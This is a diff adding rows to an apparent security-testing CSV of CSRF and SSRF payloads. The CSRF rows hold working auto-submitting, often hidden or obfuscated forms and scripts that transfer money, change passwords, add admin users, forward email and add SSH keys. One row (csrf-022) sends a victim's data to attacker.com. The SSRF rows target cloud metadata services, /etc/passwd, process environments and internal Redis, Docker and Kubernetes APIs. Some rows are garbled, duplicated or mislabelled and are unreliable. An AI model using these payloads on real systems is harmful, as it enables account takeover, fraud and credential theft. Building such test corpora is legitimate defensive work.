+csrf-017,csrf,CSRF,CSRF using form with target iframe to hide submission,<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/settings' method='POST' target='hiddenFrame' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,high
+csrf-018,csrf,CSRF,CSRF using form with GET method and auto-submit,<form action='https://target.com/add-friend' method='GET' id='f'><input name='user' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,medium
+csrf-019,csrf,CSRF,CSRF using meta refresh with POST form submission via JavaScript,<form id='f' action='https://target.com/subscribe' method='POST'><input name='plan' value='premium'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,high
+csrf-020,csrf,CSRF,CSRF using script with navigator.sendBeacon to send data,"<script>navigator.sendBeacon('https://target.com/api/track', 'action=subscribe');</script>",Malicious webpage,medium
+csrf-021,csrf,CSRF,CSRF using stealth iframe with delayed form submission,"<iframe style='display:none' id='f'></iframe><form action='https://target.com/api/transfer' method='POST' target='f' id='form'><input name='amount' value='9999'/><input name='to' value='attacker'/></form><script>setTimeout(()=>document.getElementById('form').submit(),2000);</script>",Malicious webpage,high
+csrf-022,csrf,CSRF,CSRF using fetch with chained promises to exfiltrate response,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',body:'setting=evil'}).then(r=>r.text()).then(t=>fetch('https://attacker.com/log?data='+encodeURIComponent(t)));</script>",Malicious webpage,critical
+csrf-023,csrf,CSRF,CSRF using form with multiple hidden inputs and auto-submit,<form action='https://target.com/api/settings' method='POST' id='f'><input type='hidden' name='mode' value='stealth'/><input type='hidden' name='level' value='admin'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,high
+csrf-024,csrf,CSRF,CSRF using image with onload event triggering XMLHttpRequest,"<img src='https://target.com/api/trigger' onload=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/confirm',true);xhr.withCredentials=true;xhr.send('confirm=yes');"">",Malicious webpage,high
+csrf-025,csrf,CSRF,CSRF using SVG with embedded script to submit form,<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>,Malicious webpage,critical
+csrf-026,csrf,CSRF,CSRF using beacon API with custom payload,"<script>navigator.sendBeacon('https://target.com/api/track','action=steal');</script>",Malicious webpage,medium
+csrf-027,csrf,CSRF,CSRF using form with enctype multipart/form-data and auto-submit,<form action='https://target.com/api/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,medium
+csrf-028,csrf,CSRF,CSRF using iframe with srcdoc containing auto-submitting form,"<iframe style='display:none' srcdoc=""<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>""></iframe>",Malicious webpage,high
+csrf-029,csrf,CSRF,CSRF using script with setTimeout to chain multiple requests,"<script>setTimeout(()=>fetch('https://target.com/api/step1',{method:'POST',credentials:'include'}),1000);setTimeout(()=>fetch('https://target.com/api/step2',{method:'POST',credentials:'include'}),3000);</script>",Malicious webpage,high
+csrf-030,csrf,CSRF,CSRF using form with target iframe and hidden inputs,<iframe name='hidden' style='display:none'></iframe><form action='https://target.com/api/settings' method='POST' target='hidden' id='f'><input name='mode' value='stealth'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,high
+csrf-031,csrf,CSRF,CSRF using fetch with spoofed headers (may bypass naive CSRF tokens),"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'data=evil'});</script>",Malicious webpage,high
+csrf-032,csrf,CSRF,CSRF using form with onsubmit event modifying data,"<form action='https://target.com/api/submit' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>",Malicious webpage,high
+csrf-033,csrf,CSRF,CSRF using image with onerror event triggering fetch,"<img src='invalid.jpg' onerror=""fetch('https://target.com/api/like',{method:'POST',credentials:'include',body:'post=123'});"">",Malicious webpage,high
+csrf-034,csrf,CSRF,CSRF using meta refresh to redirect to GET endpoint,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=premium'/>,Malicious webpage,medium
+csrf-035,csrf,CSRF,CSRF using script to create and submit form dynamically,<script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script>,Malicious webpage,critical
+csrf-036,csrf,CSRF,CSRF using fetch with JSON payload (if API accepts),"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete'})});</script>",Malicious webpage,high
+csrf-037,csrf,CSRF,CSRF using form with multiple steps and chained submissions,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2000);</script>",Malicious webpage,high
+csrf-038,csrf,CSRF,CSRF using iframe with srcdoc and script to submit form,"<iframe style='display:none' srcdoc=""<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>""></iframe>",Malicious webpage,high
+csrf-039,csrf,CSRF,"CSRF using script with asyncawait fetch('https://target.com/api/async',{method:'POST',credentials:'include',body:'action=async'});</script>",,Malicious webpage,high
+csrf-040,csrf,CSRF,CSRF using form with hidden iframe and delayed submission,"<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/api/hidden' method='POST' target='hiddenFrame' id='f'><input name='secret' value='data'/></form><script>setTimeout(()=>document.getElementById('f').submit(),1500);</script>",Malicious webpage,high
+csrf-041,csrf,CSRF,CSRF using script to create image with onload triggering fetch,"<script>var img=new Image();img.onload=function(){fetch('https://target.com/api/action',{method:'POST',credentials:'include'});};img.src='https://target.com/api/trigger';</script>",Malicious webpage,high
+csrf-042,csrf,CSRF,CSRF using form with multiple hidden inputs and chained submission,"<form action='https://target.com/api/first' method='POST' id='f1'><input type='hidden' name='step' value='1'/></form><form action='https://target.com/api/second' method='POST' id='f2'><input type='hidden' name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2500);</script>",Malicious webpage,high
+csrf-043,csrf,CSRF,CSRF using fetch with custom headers and JSON body,"<script>fetch('https://target.com/api/custom',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({cmd:'run'})});</script>",Malicious webpage,high
+csrf-044,csrf,CSRF,CSRF using form with onsubmit event to modify hidden input,"<form action='https://target.com/api/modify' method='POST' onsubmit='this.token.value=""hacked""'><input type='hidden' name='token' value='original'/></form><script>document.forms[0].submit();</script>",Malicious webpage,high
+csrf-045,csrf,CSRF,CSRF using image with onerror event to trigger XMLHttpRequest,"<img src='nonexistent.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/like',true);xhr.withCredentials=true;xhr.send('post=999');"">",Malicious webpage,high
+csrf-046,csrf,CSRF,CSRF using meta refresh to redirect to sensitive GET endpoint,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=vip'/>,Malicious webpage,medium
+csrf-047,csrf,CSRF,CSRF using script to dynamically create and submit form with delay,"<script>setTimeout(()=>{var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},2000);</script>",Malicious webpage,critical
+csrf-048,csrf,CSRF,CSRF using fetch with JSON body and credentials,"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({delete:true})});</script>",Malicious webpage,high
+csrf-049,csrf,CSRF,CSRF using chained form submissions with timeouts,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),3000);</script>",Malicious webpage,high
+csrf-050,csrf,CSRF,CSRF using iframe with srcdoc and auto-submitting form,"<iframe style='display:none' srcdoc=""<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>""></iframe>",Malicious webpage,high
+csrf-051,csrf,CSRF,CSRF to add admin user via hidden form,<form action='https://example.com/admin/add-user' method='POST' id='f'><input name='username' value='eviladmin'/><input name='role' value='admin'/></form><script>document.getElementById('f').submit();</script>,Admin panel user management,critical
+csrf-052,csrf,CSRF,CSRF to change email notification settings,<form action='https://mail.example.com/settings/notifications' method='POST' id='f'><input name='email_alerts' value='off'/></form><script>document.getElementById('f').submit();</script>,Email service user settings,medium
+csrf-053,csrf,CSRF,CSRF to reset 2FA via GET request,<img src='https://secure.example.com/2fa/reset?user=target' style='display:none'/>,Security 2FA reset endpoint,high
+csrf-054,csrf,CSRF,CSRF to subscribe victim to premium service,<meta http-equiv='refresh' content='0;url=https://streaming.example.com/subscribe?plan=premium'/>,Streaming service subscription,medium
+csrf-055,csrf,CSRF,CSRF to change victim's shipping address,<form action='https://shop.example.com/account/address' method='POST' id='f'><input name='address' value='123 Evil St'/></form><script>document.getElementById('f').submit();</script>,E-commerce user profile,high
+csrf-056,csrf,CSRF,CSRF to add attacker as friend,<form action='https://social.example.com/friends/add' method='POST' id='f'><input name='friend_id' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Social media friend management,medium
+csrf-057,csrf,CSRF,CSRF to post malicious comment,<form action='https://blog.example.com/comments' method='POST' id='f'><input name='post_id' value='123'/><textarea name='comment'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,Blog comment submission,medium
+csrf-058,csrf,CSRF,CSRF to change victim's profile picture,<form action='https://social.example.com/profile/picture' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='avatar' value='evil.jpg'/></form><script>document.getElementById('f').submit();</script>,Social media profile update,medium
+csrf-059,csrf,CSRF,CSRF to initiate money transfer,<form action='https://bank.example.com/transfer' method='POST' id='f'><input name='amount' value='10000'/><input name='to_account' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Online banking transfer,critical
+csrf-060,csrf,CSRF,CSRF to disable security alerts,<form action='https://security.example.com/settings' method='POST' id='f'><input name='alerts' value='off'/></form><script>document.getElementById('f').submit();</script>,Security settings,high
+csrf-061,csrf,CSRF,CSRF to change victim's password,<form action='https://example.com/account/change-password' method='POST' id='f'><input name='new_password' value='P@ssw0rdHacked'/></form><script>document.getElementById('f').submit();</script>,User account management,critical
+csrf-062,csrf,CSRF,CSRF to add malicious webhook URL,<form action='https://ci.example.com/settings/webhooks' method='POST' id='f'><input name='url' value='https://attacker.com/hook'/></form><script>document.getElementById('f').submit();</script>,Continuous Integration webhook settings,high
+csrf-063,csrf,CSRF,CSRF to change victim's timezone,<form action='https://calendar.example.com/settings' method='POST' id='f'><input name='timezone' value='UTC+14'/></form><script>document.getElementById('f').submit();</script>,Calendar application settings,low
+csrf-064,csrf,CSRF,CSRF to enable auto-forwarding of emails,<form action='https://mail.example.com/settings/forwarding' method='POST' id='f'><input name='forward_to' value='attacker@example.com'/></form><script>document.getElementById('f').submit();</script>,Email forwarding settings,high
+csrf-065,csrf,CSRF,CSRF to add malicious SSH key,<form action='https://git.example.com/account/keys' method='POST' id='f'><textarea name='key'>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA...</textarea></form><script>document.getElementById('f').submit();</script>,Git hosting service SSH keys,critical
+csrf-066,csrf,CSRF,CSRF to change victim's language preference,<form action='https://example.com/settings/language' method='POST' id='f'><input name='lang' value='xx-XX'/></form><script>document.getElementById('f').submit();</script>,User interface settings,low
+csrf-067,csrf,CSRF,CSRF to add victim to attacker's mailing list,<form action='https://newsletter.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>,Newsletter subscription,low
+csrf-068,csrf,CSRF,CSRF to post malicious tweet,<form action='https://twitter.com/i/tweet/create' method='POST' id='f'><textarea name='tweet'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,Social media posting,medium
+csrf-069,csrf,CSRF,CSRF to add victim's phone number to spam list,<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>,SMS spam management,medium
+csrf-070,csrf,CSRF,CSRF to change victim's default payment method,<form action='https://payments.example.com/account/payment-method' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>,Payment gateway account settings,high
+csrf-071,csrf,CSRF,CSRF to enable auto-approve on code reviews,<form action='https://code.example.com/reviews/settings' method='POST' id='f'><input name='auto_approve' value='true'/></form><script>document.getElementById('f').submit();</script>,Code review platform settings,high
+csrf-072,csrf,CSRF,CSRF to add victim's device to attacker's monitoring,<form action='https://iot.example.com/devices/add' method='POST' id='f'><input name='device_id' value='attacker_device'/></form><script>document.getElementById('f').submit();</script>,IoT device management,high
+csrf-073,csrf,CSRF,CSRF to change victim's calendar event,<form action='https://calendar.example.com/events/edit' method='POST' id='f'><input name='event_id' value='123'/><input name='title' value='Hacked Event'/></form><script>document.getElementById('f').submit();</script>,Calendar event management,medium
+csrf-074,csrf,CSRF,CSRF to add victim's IP to blacklist,<form action='https://firewall.example.com/blacklist/add' method='POST' id='f'><input name='ip' value='victim_ip'/></form><script>document.getElementById('f').submit();</script>,Firewall management,high
+csrf-075,csrf,CSRF,CSRF to change victim's DNS settings,<form action='https://dns.example.com/settings' method='POST' id='f'><input name='dns_server' value='8.8.8.8'/></form><script>document.getElementById('f').submit();</script>,DNS management,high
+csrf-076,csrf,CSRF,CSRF to add victim to attacker's mailing list,<form action='https://mailinglist.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>,Mailing list subscription,low
+csrf-077,csrf,CSRF,CSRF to change victim's profile bio,<form action='https://social.example.com/profile/bio' method='POST' id='f'><textarea name='bio'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,Social media profile,medium
+csrf-078,csrf,CSRF,CSRF to add victim's phone number to spam list,<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>,SMS spam management,medium
+csrf-079,csrf,CSRF,CSRF to change victim's notification preferences,<form action='https://app.example.com/settings/notifications' method='POST' id='f'><input name='push_notifications' value='off'/></form><script>document.getElementById('f').submit();</script>,App notification settings,medium
+csrf-080,csrf,CSRF,CSRF to add victim's credit card to attacker's account,<form action='https://payments.example.com/account/add-card' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>,Payment gateway,critical
+csrf-081,csrf,CSRF,CSRF with base64 encoded form and dynamic decoding,<script>var b='PGZvcm0gYWN0aW9uPSdodHRwczovL3RhcmdldC5jb20vYWN0aW9uL3VwZGF0ZScgbWV0aG9kPSdQT1NUJz48aW5wdXQgbmFtZT0nZGF0YScgdmFsdWU9J2V2aWwnPjwvaW5wdXQ+PC9mb3JtPg==';var d=atob(b);var f=document.createElement('div');f.innerHTML=d;document.body.appendChild(f);f.firstChild.submit();</script>,Dynamic base64 decoded form submission,high
+csrf-082,csrf,CSRF,CSRF with hex encoded script and eval,<script>eval(unescape('%66%6f%72%6d%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%66%6f%72%6d%27%29%3b%66%6f%72%6d%2e%61%63%74%69%6f%6e%20%3d%20%27%68%74%74%70%73%3a%2f%2f%74%61%72%67%65%74%2e%63%6f%6d%2f%75%70%64%61%74%65%27%3b%66%6f%72%6d%2e%6d%65%74%68%6f%64%20%3d%20%27%50%4f%53%54%27%3b%76%61%72%20%69%6e%70%75%74%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%69%6e%70%75%74%27%29%3b%69%6e%70%75%74%2e%6e%61%6d%65%20%3d%20%27%64%61%74%61%27%3b%69%6e%70%75%74%2e%76%61%6c%75%65%20%3d%20%27%65%76%69%6c%27%3b%66%6f%72%6d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%69%6e%70%75%74%29%3b%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%66%6f%72%6d%29%3b%66%6f%72%6d%2e%73%75%62%6d%69%74%28%29%3b'));</script>,Hex encoded script with eval,high
+csrf-083,csrf,CSRF,CSRF with dynamically created iframe and delayed form submission,"<script>var i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/transfer"" method=""POST"" id=""f""><input name=""amount"" value=""1000""/></form><script>document.getElementById(\'f\').submit();</script>');d.close();</script>",Dynamic iframe with form,high
+csrf-084,csrf,CSRF,CSRF with obfuscated string concatenation,<script>var a='ht';var b='tps://';var c='target';var d='.com';var e='/api/evil';var f=document.createElement('form');f.action=a+b+c+d+e;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,String concatenation obfuscation,high
+csrf-085,csrf,CSRF,CSRF with event-triggered form submission on mouseover,"<form action='https://target.com/api/settings' method='POST' id='f'><input name='mode' value='stealth'/></form><div onmouseover='document.getElementById(""f"").submit()'>Hover me</div>",User interaction triggered CSRF,medium
+csrf-086,csrf,CSRF,CSRF with delayed execution using setTimeout and obfuscated function,"<script>setTimeout(function(){var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},3000);</script>",Delayed form submission,high
+csrf-087,csrf,CSRF,CSRF with encoded URI components and dynamic decoding,<script>var p=decodeURIComponent('%66%6f%72%6d');var f=document.createElement(p);f.action='https://target.com/api/update';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,Encoded element creation,high
+csrf-088,csrf,CSRF,CSRF with stealth iframe and form submission via postMessage,"<iframe id='f' style='display:none'></iframe><script>var i=document.getElementById('f');i.src='about:blank';i.onload=function(){var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/steal"" method=""POST"" id=""form""><input name=""data"" value=""evil""/></form>');d.close();d.getElementById('form').submit();};</script>",Stealth iframe with postMessage,critical
+csrf-089,csrf,CSRF,CSRF with obfuscated script using string split and join,<script>var s='ht'+'tp'+'s:'+'//ta'+'rget.com/api/evil';var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,String split and join obfuscation,high
+csrf-090,csrf,CSRF,CSRF with script tag injection via innerHTML,"<div id='container'></div><script>document.getElementById('container').innerHTML='<form action=""https://target.com/api/hack"" method=""POST"" id=""f""><input name=""data"" value=""evil""/></form><script>document.getElementById(\'f\').submit();</script>';</script>",Script injection via innerHTML,critical
+csrf-091,csrf,CSRF,CSRF with obfuscated base64 and eval,<script>eval(atob('dmFyIGY9ZG9jdW1lbnQuYWxlbWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7IGYuYWN0aW9uID0naHR0cHM6Ly90YXJnZXQuY29tL2FwaS9leGl0JztmLm1ldGhvZCA9J1BPU1QnOyB2YXIgaSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lucHV0Jyk7IGku bmFtZSA9J2RhdGEnOyBpLnZhbHVlID0nZXZpbCc7IGYucGFzc0NoaWxkKGlpKTsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmKTsgZi5zdWJtaXQoKTs='));</script>,Base64 encoded eval obfuscation,critical
+csrf-092,csrf,CSRF,CSRF with SVG image and embedded script,"<svg xmlns='http://www.w3.org/2000/svg'><script><![CDATA[fetch('https://target.com/api/evil',{method:'POST',body:'data=evil'})]]></script></svg>",SVG embedded script,high
+csrf-093,csrf,CSRF,CSRF with meta refresh and URL encoded payload,<meta http-equiv='refresh' content='0;url=https%3A%2F%2Ftarget.com%2Fapi%2Fupdate%3Fdata%3Devil'/>,Meta refresh with URL encoding,medium
+csrf-094,csrf,CSRF,CSRF with JavaScript URL and obfuscated payload,"<a href=""javascript:(function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})()"">Click me</a>",JavaScript URL with obfuscation,high
+csrf-095,csrf,CSRF,CSRF with hidden image and onerror event,"<img src='invalid.jpg' onerror=""var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();"" style='display:none'/>",Image onerror event trigger,high
+csrf-096,csrf,CSRF,CSRF with obfuscated Unicode escapes,<script>var a=\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074;var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,Unicode escape obfuscation,high
+csrf-097,csrf,CSRF,CSRF with CSS expression to trigger script,"<div style=""width:expression((function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})())""></div>",CSS expression injection,high
+csrf-098,csrf,CSRF,CSRF with XMLHttpRequest and obfuscated URL,"<script>var xhr=new XMLHttpRequest();var u='https://target.com/api/evil';xhr.open('POST',u,true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('data=evil');</script>",XHR POST request,critical
+csrf-099,csrf,CSRF,CSRF with form submission triggered by CSS animation,<style>@keyframes x{from{opacity:0}to{opacity:1}}</style><form action='https://target.com/api/evil' method='POST' id='f' style='animation:x 1s forwards' onanimationend='this.submit()'><input name='data' value='evil'/></form>,CSS animation event trigger,medium
+csrf-100,csrf,CSRF,CSRF with obfuscated script using array join,"<script>var s=['ht','tp','s:','//','target','.com','/api','/evil'].join('');var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>",Array join obfuscation,high
+ssrf-001,ssrf,SSRF,Basic SSRF to internal IP,http://127.0.0.1/,Access internal localhost service,high
+ssrf-002,ssrf,SSRF,SSRF to internal private IP range,http://192.168.1.1/,Access internal network device,high
+ssrf-003,ssrf,SSRF,SSRF to metadata service on AWS,http://169.254.169.254/latest/meta-data/,AWS EC2 instance metadata,critical
+ssrf-004,ssrf,SSRF,SSRF to GCP metadata service,http://metadata.google.internal/computeMetadata/v1/,Google Cloud metadata,critical
+ssrf-005,ssrf,SSRF,SSRF to Azure instance metadata,http://169.254.169.254/metadata/instance?api-version=2021-02-01,Azure VM metadata,critical
+ssrf-006,ssrf,SSRF,SSRF to internal Redis service,redis://127.0.0.1:6379,Access internal Redis,high
+ssrf-007,ssrf,SSRF,SSRF to internal Memcached service,memcached://127.0.0.1:11211,Access internal Memcached,high
+ssrf-008,ssrf,SSRF,SSRF to internal FTP server,ftp://127.0.0.1/,Access internal FTP,medium
+ssrf-009,ssrf,SSRF,SSRF to internal SMB share,smb://192.168.1.100/share,Access internal SMB share,high
+ssrf-010,ssrf,SSRF,SSRF to internal Docker API,http://127.0.0.1:2375/containers/json,Access Docker API,critical
+ssrf-011,ssrf,SSRF,SSRF to internal Kubernetes API,https://kubernetes.default.svc/api,Access Kubernetes API,critical
+ssrf-012,ssrf,SSRF,SSRF to internal Jenkins API,http://127.0.0.1:8080/api/json,Access Jenkins API,high
+ssrf-013,ssrf,SSRF,SSRF to internal Elasticsearch cluster,http://127.0.0.1:9200/_cat/indices?v,Access Elasticsearch,high
+ssrf-014,ssrf,SSRF,SSRF to internal RabbitMQ management API,http://127.0.0.1:15672/api/overview,Access RabbitMQ API,high
+ssrf-015,ssrf,SSRF,SSRF to internal MySQL service,mysql://127.0.0.1:3306,Access MySQL service,high
+ssrf-016,ssrf,SSRF,SSRF to internal PostgreSQL service,postgresql://127.0.0.1:5432,Access PostgreSQL service,high
+ssrf-017,ssrf,SSRF,SSRF to internal SMTP server,smtp://127.0.0.1:25,Access SMTP server,medium
+ssrf-018,ssrf,SSRF,SSRF to internal SNMP service,snmp://127.0.0.1,Access SNMP service,medium
+ssrf-019,ssrf,SSRF,SSRF to internal LDAP service,ldap://127.0.0.1:389,Access LDAP service,high
+ssrf-020,ssrf,SSRF,SSRF to internal HTTP service with path traversal,http://127.0.0.1/../../../../etc/passwd,Attempt path traversal via SSRF,critical
+ssrf-021,ssrf,SSRF,SSRF with URL encoded internal IP,http://%31%39%32.%31%36%38.%31.%31/,URL encoded internal IP,high
+ssrf-022,ssrf,SSRF,SSRF with octal encoded IP,http://0300.0250.0001.0001/,Octal encoded IP address,high
+ssrf-023,ssrf,SSRF,SSRF with decimal encoded IP,http://3232235777/,Decimal encoded IP address,high
+ssrf-024,ssrf,SSRF,SSRF with IPv6 loopback,http://[::1]/,IPv6 localhost,high
+ssrf-025,ssrf,SSRF,SSRF with file protocol to read local file,file:///etc/passwd,Local file read attempt,critical
+ssrf-026,ssrf,SSRF,SSRF with gopher protocol to send raw TCP,gopher://127.0.0.1:6379/_SET%20key%201%0D%0A,Gopher protocol to Redis,critical
+ssrf-027,ssrf,SSRF,SSRF with data URI scheme,"data:text/html;base64,PHNjcmlwdD5hbGVydCgnU1NSRiBFeHBlcmltZW50Jyk8L3NjcmlwdD4=",Data URI with embedded script,medium
+ssrf-028,ssrf,SSRF,SSRF with javascript URI scheme,javascript:alert('SSRF'),JavaScript URI scheme,low
+ssrf-029,ssrf,SSRF,SSRF with file descriptor access,file:///proc/self/environ,Access process environment,critical
+ssrf-030,ssrf,SSRF,SSRF with nested URL encoding,http://%31%32%37.%30.%30.%31%2F%2E%2E%2F%2E%2E%2Fetc/passwd,Nested URL encoded path traversal,critical
+ssrf-031,ssrf,SSRF,SSRF with FTP protocol and directory traversal,ftp://127.0.0.1/../../../../etc/passwd,FTP directory traversal,critical
+ssrf-032,ssrf,SSRF,SSRF with SMB protocol and UNC path,smb://127.0.0.1/../../../../Windows/System32/drivers/etc/hosts,SMB UNC path traversal,critical
+ssrf-033,ssrf,SSRF,SSRF with HTTP request smuggling attempt,http://127.0.0.1:80/%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a,HTTP request smuggling,critical
+ssrf-034,ssrf,SSRF,SSRF with HTTP header injection,"http://127.0.0.1:80/
+X-Injected-Header: evil",HTTP header injection,critical
+ssrf-035,ssrf,SSRF,SSRF with HTTP basic auth to internal service,http://admin:password@127.0.0.1/admin,Basic auth credentials,high
+ssrf-036,ssrf,SSRF,SSRF with HTTP redirect to internal IP,http://external.com/redirect?url=http://127.0.0.1/,Redirect to internal IP,high
+ssrf-037,ssrf,SSRF,SSRF with DNS rebinding attack,http://evil.com/,DNS rebinding to internal IP,critical
+ssrf-038,ssrf,SSRF,SSRF with IPv4 mapped IPv6 address,http://[::ffff:127.0.0.1]/,IPv4 mapped IPv6,high
+ssrf-039,ssrf,SSRF,SSRF with encoded newline characters,http://127.0.0.1/%0a%0d,Encoded newline injection,medium
+ssrf-040,ssrf,SSRF,SSRF with HTTP POST method override,http://127.0.0.1/?_method=POST,Method override parameter,medium
+ssrf-041,ssrf,SSRF,SSRF with HTTP chunked transfer encoding,http://127.0.0.1/chunked,Chunked transfer encoding test,medium
+ssrf-042,ssrf,SSRF,SSRF with HTTP TRACE method,http://127.0.0.1/trace,HTTP TRACE method test,medium
+ssrf-043,ssrf,SSRF,SSRF with HTTP OPTIONS method,http://127.0.0.1/options,HTTP OPTIONS method test,medium
+ssrf-044,ssrf,SSRF,SSRF with HTTP CONNECT method,http://127.0.0.1/connect,HTTP CONNECT method test,medium
+ssrf-045,ssrf,SSRF,SSRF with HTTP PATCH method,http://127.0.0.1/patch,HTTP PATCH method test,medium
+ssrf-046,ssrf,SSRF,SSRF with HTTP DELETE method,http://127.0.0.1/delete,HTTP DELETE method test,medium
+ssrf-047,ssrf,SSRF,SSRF with HTTP PUT method,http://127.0.0.1/put,HTTP PUT method test,medium
+ssrf-048,ssrf,SSRF,HTTP PUT method test,http://127.0.0.1/put,HTTP PUT method test,medium
+ssrf-049,ssrf,SSRF,SSRF with HTTP header injection via URL,"http://127.0.0.1/
+X-Forwarded-For: 127.0.0.1",Inject X-Forwarded-For header,high
+ssrf-050,ssrf,SSRF,SSRF with HTTP userinfo section to bypass filters,http://127.0.0.1@evil.com/,Userinfo section in URL,high
+ssrf-051,ssrf,SSRF,SSRF with dict protocol to query dictionary service,dict://127.0.0.1/,Access internal dictionary service,medium
+ssrf-052,ssrf,SSRF,SSRF with telnet protocol,telnet://127.0.0.1:23,Access internal telnet service,medium
+ssrf-053,ssrf,SSRF,SSRF with ldap protocol to query LDAP server,"ldap://127.0.0.1:389/ou=users,dc=example,dc=com?uid",LDAP query,high
+ssrf-054,ssrf,SSRF,SSRF with rdp protocol,rdp://127.0.0.1:3389,Access internal RDP service,medium
+ssrf-055,ssrf,SSRF,SSRF with smb protocol to access Windows share,smb://127.0.0.1/share,Access SMB share,high
+ssrf-056,ssrf,SSRF,SSRF with nfs protocol,nfs://127.0.0.1/export,Access NFS export,medium
+ssrf-057,ssrf,SSRF,SSRF with imap protocol,imap://127.0.0.1:143,Access IMAP mail server,medium
+ssrf-058,ssrf,SSRF,SSRF with pop3 protocol,pop3://127.0.0.1:110,Access POP3 mail server,medium
